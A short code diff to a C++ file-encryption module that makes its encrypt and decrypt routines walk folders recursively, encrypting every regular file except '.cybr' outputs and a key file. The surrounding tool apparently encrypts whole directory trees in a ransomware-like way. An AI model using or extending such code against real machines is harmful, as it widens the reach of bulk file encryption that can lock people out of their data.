@@ -89,7 +89,7 @@ namespace FileOps
     }
 
     /**
-     * Processes all eligible files for encryption using 4MB chunks (libsodium secretstream).
+     * Processes all eligible files recursively for encryption using 4MB chunks (libsodium secretstream).
      */
     void process_encryption(const std::vector<unsigned char> &symkey)
     {
@@ -97,8 +97,10 @@ namespace FileOps
         if (!fs::exists(target))
             return;
 
-        for (const auto &entry : fs::directory_iterator(target))
+        // Switched to recursive_directory_iterator to traverse into subfolders
+        for (const auto &entry : fs::recursive_directory_iterator(target))
         {
+            // Explicitly ensure it's a regular file before processing, ignoring directories and excluded extensions
             if (!entry.is_regular_file() || entry.path().extension() == Config::FILE_EXTENSION ||
                 entry.path().filename() == Config::EWK_FILENAME)
                 continue;
@@ -178,7 +180,7 @@ namespace FileOps
     }
 
     /**
-     * Processes all .cybr files for decryption using 4MB chunks (libsodium secretstream).
+     * Processes all .cybr files recursively for decryption using 4MB chunks (libsodium secretstream).
      */
     void process_decryption(const std::vector<unsigned char> &symkey)
     {
@@ -186,8 +188,10 @@ namespace FileOps
         if (!fs::exists(target))
             return;
 
-        for (const auto &entry : fs::directory_iterator(target))
+        // Switched to recursive_directory_iterator to traverse into subfolders
+        for (const auto &entry : fs::recursive_directory_iterator(target))
         {
+            // Explicitly ensure it's a regular file and has the correct extension before processing
             if (!entry.is_regular_file() || entry.path().extension() != Config::FILE_EXTENSION)
                 continue;
 
